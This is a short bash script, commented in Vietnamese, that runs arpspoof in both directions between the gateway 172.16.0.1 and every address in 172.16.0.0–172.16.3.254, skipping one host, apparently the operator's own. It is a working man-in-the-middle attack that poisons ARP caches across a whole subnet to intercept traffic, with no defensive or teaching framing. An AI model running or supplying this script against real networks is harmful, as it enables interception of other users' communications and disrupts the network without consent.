#!/bin/bash

# Giao diện mạng, ví dụ: wlan0
interface="wlan0"

# Địa chỉ IP của gateway
gateway_ip="172.16.0.1"

# Quét qua octet thứ ba và cuối cùng
for third_octet in $(seq 0 3); do
    for fourth_octet in $(seq 1 254); do
        target_ip="172.16.$third_octet.$fourth_octet"
        if [ "$target_ip" = "172.16.2.66" ]; then
            continue
        fi
        sudo arpspoof -i $interface -t $target_ip $gateway_ip &
        sudo arpspoof -i $interface -t $gateway_ip $target_ip &
    done
done
